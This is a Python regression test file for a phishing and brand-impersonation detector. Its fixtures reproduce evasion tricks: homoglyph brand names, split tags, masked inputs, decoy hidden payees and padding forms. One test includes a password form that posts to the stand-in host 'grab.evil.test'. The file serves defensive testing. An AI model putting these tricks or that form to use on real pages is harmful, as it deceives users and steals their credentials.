"""Regression tests for evasions and false positives found in the M5 review.

Each test pins one concrete trick against the extractors or the policy, so a
future change that reopens it fails here with a named cause.
"""

import time

from tests.detection_support import context, lab_site, score_html

from brandsentinel.analysis import Page, run_extractors
from brandsentinel.analysis.association import brand_references
from brandsentinel.analysis.payment import payment
from brandsentinel.analysis.static import page_content

CYRILLIC_EM = chr(0x041C)  # renders as Latin "M"
GREEK_ALPHA = chr(0x0391)  # renders as Latin "A"


def pg(html: str, url: str = "http://site.test/") -> Page:
    return Page(html, url, context())


def kinds(html: str) -> tuple[set, set]:
    v = brand_references(pg(html))
    return {c["kind"] for c in v["claims"]}, {c["kind"] for c in v["disclaimers"]}


# --- association claims --------------------------------------------------------------


def test_an_earlier_possessive_does_not_hide_a_later_claim():
    claims, _ = kinds(
        "<p>Lumina Foundation's devotees: we are the official site for Lumina Foundation"
        " donations.</p>"
    )
    assert "official" in claims
    own_site, _ = kinds("<p>Donate through Lumina Foundation's official website.</p>")
    assert own_site == set()


def test_an_unrelated_negation_does_not_turn_a_claim_into_a_disclaimer():
    claims, disclaimers = kinds(
        "<p>No fees, we are the official site for Lumina Foundation donations.</p>"
    )
    assert "official" in claims and not disclaimers
    claims, _ = kinds("<p>No hidden charges - official partner of Lumina Foundation.</p>")
    assert "partner" in claims
    claims, disclaimers = kinds("<p>We are not an official partner of Lumina Foundation.</p>")
    assert not claims and disclaimers
    claims, disclaimers = kinds("<p>This site is not affiliated with Lumina Foundation.</p>")
    assert not claims and disclaimers


def test_uppercase_cyrillic_and_greek_lookalikes_match_the_brand():
    v = brand_references(pg(f"<h1>LU{CYRILLIC_EM}IN{GREEK_ALPHA} FOUNDATION</h1>"))
    assert v["presented"] == ["lumina-foundation"]


def test_brand_split_across_inline_elements_still_matches():
    v = brand_references(pg("<h1>Lum<span>ina</span> Foundation Members</h1>"))
    assert v["presented"] == ["lumina-foundation"]
    html = (
        "<div><p>Lum<b>ina</b> Foundation is moving accounts.</p>"
        '<form action="/x"><input type="password"></form></div>'
    )
    (form,) = page_content(pg(html))["forms"]
    assert {"brand": "lumina-foundation", "strength": "strong"} in form["brands_in_context"]


# --- credential fields -----------------------------------------------------------------


def test_masked_text_inputs_and_password_named_fields_are_credentials():
    html = (
        '<form><input type="text" name="secret" style="-webkit-text-security: disc"></form>'
        '<form><input type="text" name="pwd"></form>'
        '<form><input type="text" name="passenger_name"></form>'
    )
    v = page_content(pg(html))
    assert [f["password_fields"] for f in v["forms"]] == [1, 1, 0]
    assert v["credential"]["password_fields"] == 2


def test_padding_with_empty_forms_does_not_hide_the_credential_form():
    padding = '<form action="/f"><input name="q"></form>' * 40
    html = padding + '<form action="https://grab.evil.test/p"><input type="password"></form>'
    v = page_content(pg(html, "https://lumina-x.test/"))
    assert len(v["forms"]) == 20
    assert v["credential"]["cross_origin_credential_forms"] == [40]


def test_a_form_directly_under_body_does_not_take_the_whole_page_as_context():
    html = (
        "<body><p>A long article about Lumina Foundation and its critics.</p>"
        + "<p>Filler paragraph.</p>" * 50
        + '<form action="/login"><label>Forum login</label><input type="password"></form></body>'
    )
    (form,) = page_content(pg(html))["forms"]
    assert form["brands_in_context"] == []


def test_benign_news_login_under_body_stays_low():
    # Known limit: the tie is proximity-based, so a login form right after a very
    # short brand paragraph reads like the disguised-credential lab page.
    _, r = score_html(
        "<title>Lumina Foundation faces questions - Metro</title><body>"
        "<article><h1>Lumina Foundation faces questions</h1>"
        + "<p>Council members discussed the river data at length on Monday.</p>"
        * 30
        + "</article>"
        '<form action="/login"><input type="email"><input type="password"></form></body>',
        "https://metro-news.test/a",
    )
    assert "credential_form_brand" not in {x.rule for x in r.reasons}


# --- payment identifiers -------------------------------------------------------------


def test_vpa_followed_by_punctuation_is_detected_but_email_is_not():
    v = payment(pg("<p>Pay to relief.fund@okaxis. Or (other.one@ybl), mail info@site.org</p>"))
    assert set(v["vpas_in_text"]) == {"relief.fund@okaxis", "other.one@ybl"}


def test_grouped_bank_account_numbers_are_normalized():
    v = payment(pg("<p>Bank account no: 0001 2345 6789, IFSC ABCD0123456.</p>"))
    assert v["bank_accounts"] == [{"account": "000123456789", "ifsc": "ABCD0123456"}]


def test_upi_links_in_area_onclick_and_data_attributes_are_observed():
    html = (
        '<map><area href="upi://pay?pa=area.payee@ybl&amp;pn=Lumina%20Relief"></map>'
        "<button onclick=\"location='upi://pay?pa=click.payee@okaxis&amp;pn=X'\">Pay</button>"
        '<div data-pay="upi://pay?pa=data.payee@ibl"></div>'
    )
    v = payment(pg(html))
    upi = {u["pa"]: u for u in v["upi_links"]}
    assert set(upi) == {"area.payee@ybl", "click.payee@okaxis", "data.payee@ibl"}
    assert upi["area.payee@ybl"]["pn"] == "Lumina Relief"  # &amp; decoded, single decode


def test_a_hidden_copy_of_the_real_payee_earns_no_relief():
    expected, html = lab_site("donation-fraud")
    decoy = html.replace(
        b"</body>",
        b'<p style="display:none">upi://pay?pa=lumina.foundation@lumenbank</p></body>',
    )
    _, plain = score_html(html, expected["url"])
    _, with_decoy = score_html(decoy, expected["url"])
    assert "confirmed_payee" not in {x.rule for x in with_decoy.reasons}
    assert with_decoy.score == plain.score and with_decoy.priority == "P1"


def test_lab_sites_keep_their_outcomes_after_the_review_fixes():
    for site in ("donation-fraud", "disguised-credential", "false-association", "news-critical"):
        expected, html = lab_site(site)
        _, r = score_html(html, expected["url"])
        want = expected["expected"]
        assert r.priority in want["priority"] and r.category == want["category"], site


# --- hostile structure stays fast ---------------------------------------------------------


def test_deeply_nested_markup_and_whitespace_runs_stay_fast():
    pages = [
        "<div>" * 20000 + "By Staff" + "</div>" * 20000,
        "<p>Lumina Foundation" + " " * 200_000 + " official partner of Lumina Foundation</p>",
        "<p>" + "Lumina. " * 60000 + "</p>",
    ]
    for html in pages:
        start = time.perf_counter()
        results = run_extractors(html.encode(), "text/html", None, "https://x.test/", context())
        assert all(r.error is None for r in results)
        assert time.perf_counter() - start < 5, html[:40]
